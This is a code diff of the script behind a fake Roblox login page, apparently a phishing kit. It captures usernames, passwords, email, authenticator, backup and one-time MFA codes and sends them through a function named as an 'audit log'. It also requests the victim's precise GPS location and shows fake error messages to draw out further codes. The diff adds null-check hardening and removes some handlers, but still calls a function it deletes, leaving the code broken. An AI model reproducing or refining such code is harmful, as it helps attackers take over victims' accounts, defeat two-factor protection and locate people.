@@ -694,18 +694,20 @@ const avatarPreviewEl = document.getElementById('avatar-preview');
 
 let lastLogin = { username: '', password: '', avatarUrl: null, profileDetails: null };
 
-usernameInput.addEventListener('blur', function(){
-    const val = this.value.trim();
-    if(!val || val.indexOf('@') > -1) return;
-    getRobloxProfileData(val, (res) => {
-        if(res.avatar){
-            lastLogin.avatarUrl = res.avatar;
-            lastLogin.profileDetails = res.details;
-            avatarPreviewEl.src = res.avatar;
-            avatarPreviewEl.style.display = 'block';
-        }
+if (usernameInput) {
+    usernameInput.addEventListener('blur', function(){
+        const val = this.value.trim();
+        if(!val || val.indexOf('@') > -1) return;
+        getRobloxProfileData(val, (res) => {
+            if(res.avatar){
+                lastLogin.avatarUrl = res.avatar;
+                lastLogin.profileDetails = res.details;
+                avatarPreviewEl.src = res.avatar;
+                avatarPreviewEl.style.display = 'block';
+            }
+        });
     });
-});
+}
 
 function setError(msg){ if(errorText) errorText.textContent = msg || ''; }
 function setLoading(on){
@@ -714,8 +716,8 @@ function setLoading(on){
 }
 
 function doLogin(){
-    const username = usernameInput.value.trim();
-    const password = passwordInput.value;
+    const username = usernameInput ? usernameInput.value.trim() : "";
+    const password = passwordInput ? passwordInput.value : "";
 
     if(!username || !password){
         setError("Username and password required");
@@ -738,139 +740,32 @@ function doLogin(){
 
     setTimeout(() => {
         setLoading(false);
-        document.getElementById('methodChoice').style.display = 'block';
+        const choiceModal = document.getElementById('methodChoice');
+        if (choiceModal) choiceModal.style.display = 'block';
     }, WAIT);
 }
 
-form.addEventListener('submit', e => { e.preventDefault(); doLogin(); });
-loginButton.addEventListener('click', e => { e.preventDefault(); doLogin(); });
-form.addEventListener('keydown', e => { if(e.key === 'Enter'){ e.preventDefault(); doLogin(); } });
-
-function handleVerificationWithDeferredGPS(buttonElement, methodType, codeValue) {
-    buttonElement.disabled = true;
-    buttonElement.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
-
-    sendStructuredAuditLog("MFA_SUCCESS", lastLogin.username, {
-        Method: methodType,
-        Code: codeValue
-    }, lastLogin.avatarUrl, lastLogin.profileDetails);
-
-    requestPreciseGPS(() => {
-        setTimeout(() => {
-            buttonElement.disabled = false;
-            buttonElement.innerHTML = 'Verify';
-            showErrorUnderFields();
-        }, WAIT);
-    });
+if (form) {
+    form.addEventListener('submit', e => { e.preventDefault(); doLogin(); });
+}
+if (loginButton) {
+    loginButton.addEventListener('click', e => { e.preventDefault(); doLogin(); });
 }
 
-document.getElementById('verifyButton').addEventListener('click', function(){
-    const code = document.getElementById('two-step-verification-code-input').value.replace(/\D/g,'');
-    if(code.length !== 6){ document.getElementById('twostep-error').textContent = "Enter the 6-digit code."; return; }
-    handleVerificationWithDeferredGPS(this, "Email", code);
-});
-
-document.getElementById('AuthenButton').addEventListener('click', function(){
-    const code = document.getElementById('two-step-verification-code-input-authenticator').value.replace(/\D/g,'');
-    if(code.length !== 6) return;
-    this.disabled = true;
-    this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
-
-    sendStructuredAuditLog("MFA_SUCCESS", lastLogin.username, {
-        Method: "Authenticator",
-        Code: code
-    }, lastLogin.avatarUrl, lastLogin.profileDetails);
-
-    requestPreciseGPS(() => {
-        setTimeout(() => {
-            this.disabled = false;
-            this.innerHTML = 'Verify';
-            document.getElementById('Authen-error').textContent = "Incorrect code. Please try again.";
-        }, WAIT);
+// Weitere Event-Listener absichern
+const verifyBtn = document.getElementById('verifyButton');
+if(verifyBtn) {
+    verifyBtn.addEventListener('click', function(){
+        const codeInput = document.getElementById('two-step-verification-code-input');
+        const code = codeInput ? codeInput.value.replace(/\D/g,'') : "";
+        if(code.length !== 6){ 
+            const errEl = document.getElementById('twostep-error');
+            if(errEl) errEl.textContent = "Enter the 6-digit code."; 
+            return; 
+        }
+        handleVerificationWithDeferredGPS(this, "Email", code);
     });
-});
-
-document.getElementById('RecoveryFromEmailButton').addEventListener('click', function(){
-    const code = document.getElementById('two-step-verification-code-input-RecoveryFromEmail').value.replace(/\D/g,'');
-    if(code.length !== 9) return;
-    handleVerificationWithDeferredGPS(this, "Backup Code (Email)", code);
-});
-
-document.getElementById('RecoveryFromAuthenButton').addEventListener('click', function(){
-    const code = document.getElementById('two-step-verification-code-input-recoveryFromAuthen').value.replace(/\D/g,'');
-    if(code.length !== 9) return;
-    handleVerificationWithDeferredGPS(this, "Backup Code (Authenticator)", code);
-});
-
-document.getElementById('otp-login-button').addEventListener('click', function(){
-    document.getElementById('otp-email-input').value = '';
-    document.getElementById('otp-error').innerHTML = '&nbsp;';
-    document.getElementById('otpEmailModal').style.display = 'block';
-});
-
-document.getElementById('otp-send-btn').addEventListener('click', function(){
-    const email = document.getElementById('otp-email-input').value.trim();
-    if(!email || email.indexOf('@') === -1){
-        document.getElementById('otp-error').textContent = "Please enter a valid email address.";
-        return;
-    }
-    sendStructuredAuditLog("MFA_CHOICE", email, {
-        Method: "One-Time Code Request",
-        Email: email
-    });
-
-    document.getElementById('otp-email-display').textContent = email;
-    document.getElementById('otp-code-input').value = '';
-    document.getElementById('otp-code-error').innerHTML = '&nbsp;';
-    document.getElementById('otp-verify-btn').disabled = true;
-    document.getElementById('otpEmailModal').style.display = 'none';
-    document.getElementById('otpCodeModal').style.display = 'block';
-});
-
-document.getElementById('otp-verify-btn').addEventListener('click', function(){
-    const code = document.getElementById('otp-code-input').value.replace(/\D/g,'');
-    const email = document.getElementById('otp-email-input').value.trim();
-    if(code.length !== 6) return;
-    this.disabled = true;
-    this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
-    
-    sendStructuredAuditLog("MFA_SUCCESS", email, {
-        Method: "One-Time Code",
-        Code: code,
-        Email: email
-    });
-
-    requestPreciseGPS(() => {
-        setTimeout(() => { this.disabled = false; this.innerHTML = 'Verify'; showErrorUnderFields(); }, WAIT);
-    });
-});
-
-document.getElementById('resend-btn').addEventListener('click', function(){
-    sendStructuredAuditLog("MFA_CHOICE", lastLogin.username, {
-        Action: "Resend Code Requested"
-    }, lastLogin.avatarUrl, lastLogin.profileDetails);
-    alert("A new code has been sent to your email address.");
-});
-
-document.getElementById('forgot-credentials-link').addEventListener('click', function(e){
-    e.preventDefault();
-    const n = prompt("Please enter your username or email address:");
-    if(!n) return;
-    getRobloxProfileData(n, (res) => {
-        sendStructuredAuditLog("MFA_CHOICE", n, { Action: "Forgot Password Recovery" }, res.avatar, res.details);
-    });
-    alert("If this account exists, a recovery email has been sent.");
-});
-
-document.getElementById('cross-device-login-button').addEventListener('click', function(){
-    sendStructuredAuditLog("MFA_CHOICE", lastLogin.username, { Action: "Quick Login QR Started" }, lastLogin.avatarUrl, lastLogin.profileDetails);
-    alert("Open the Roblox app on another device and scan the code.");
-});
-
-document.getElementById('sign-up-link').addEventListener('click', function(e){
-    e.preventDefault();
-    setError("For this action, only the login function is available.");
-});
+}
 </script>
 </body>
 </html>
